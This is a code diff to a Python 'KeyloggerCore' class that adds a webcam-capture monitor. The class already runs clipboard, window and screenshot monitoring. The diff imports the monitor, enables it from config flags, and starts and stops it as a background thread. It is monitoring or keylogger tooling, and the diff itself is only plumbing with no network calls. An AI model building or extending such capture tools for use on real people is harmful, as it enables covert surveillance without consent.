@@ -40,6 +40,12 @@ except Exception as e:
     logging.warning(f"ScreenshotMonitor import failed: {e}")
     ScreenshotMonitor = None
 
+# Import utilities (Camera Monitor)
+try:
+    from utils.camera_monitor import CameraMonitor
+except Exception as e:
+    logging.warning(f"CameraMonitor import failed: {e}")
+    CameraMonitor = None
 logger = logging.getLogger(__name__)
 
 
@@ -79,12 +85,14 @@ class KeyloggerCore:
         self.clipboard_listener = None
         self.window_monitor = None
         self.screenshot_monitor = None
+        self.camera_monitor = None
         
         # Threading
         self.main_thread = None
         self.stop_event = threading.Event()
         self.window_thread = None
         self.screenshot_thread = None
+        self.camera_thread = None
         
         # Statistics
         self.stats = {
@@ -215,6 +223,18 @@ class KeyloggerCore:
                     logger.info("Screenshot monitor initialized")
                 except Exception as e:
                     logger.error(f"Failed to initialize screenshot monitor: {e}")
+
+            # Initialize camera monitor if enabled
+            cam_enabled = bool(
+                self.config_manager.get('features.camera', False)
+                or self.config_manager.get('camera.enabled', False)
+            )
+            if cam_enabled and CameraMonitor is not None:
+                try:
+                    self.camera_monitor = CameraMonitor(self)
+                    logger.info("Camera monitor initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize camera monitor: {e}")
         except Exception as e:
             logger.error(f"Error initializing utilities: {e}")
     
@@ -238,13 +258,7 @@ class KeyloggerCore:
             # Ensure stop flag is cleared before starting threads
             self.stop_event.clear()
             
-            # Start listeners
-            self._start_listeners()
-            
-            # Start utility monitors (e.g., window, screenshots)
-            self._start_utilities()
-            
-            # Update state
+            # Set running state and synchronized start time BEFORE launching utilities
             self._is_running = True
             self.start_time = time.time()
             self.stats['start_time'] = self.start_time
@@ -252,6 +266,12 @@ class KeyloggerCore:
             # Initialize session stats
             self.session_stats['session_start_time'] = self.start_time
             self.session_stats['last_activity_time'] = self.start_time
+            
+            # Start listeners
+            self._start_listeners()
+            
+            # Start utility monitors (e.g., window, screenshots, camera)
+            self._start_utilities()
             
             # Log startup event
             self.log_event('system', 'keylogger_started', metadata={
@@ -318,6 +338,11 @@ class KeyloggerCore:
                 self.screenshot_thread = threading.Thread(target=self.screenshot_monitor.run, name="ScreenshotMonitorThread", daemon=True)
                 self.screenshot_thread.start()
                 logger.info("Screenshot monitor thread started")
+            # Start camera monitor
+            if self.camera_monitor and (self.camera_thread is None or not self.camera_thread.is_alive()):
+                self.camera_thread = threading.Thread(target=self.camera_monitor.run, name="CameraMonitorThread", daemon=True)
+                self.camera_thread.start()
+                logger.info("Camera monitor thread started")
         except Exception as e:
             logger.error(f"Error starting utility monitors: {e}")
     
@@ -386,12 +411,19 @@ class KeyloggerCore:
                     self.screenshot_monitor.is_running = False
                 except Exception:
                     pass
-            
+            # Hint the camera monitor to exit immediately
+            if self.camera_monitor is not None:
+                try:
+                    self.camera_monitor.is_running = False
+                except Exception:
+                    pass
             # Join threads briefly (they watch stop_event to terminate)
             if self.window_thread and self.window_thread.is_alive():
                 self.window_thread.join(timeout=2.0)
             if self.screenshot_thread and self.screenshot_thread.is_alive():
                 self.screenshot_thread.join(timeout=2.0)
+            if self.camera_thread and self.camera_thread.is_alive():
+                self.camera_thread.join(timeout=2.0)
         except Exception as e:
             logger.error(f"Error stopping utility monitors: {e}")
     
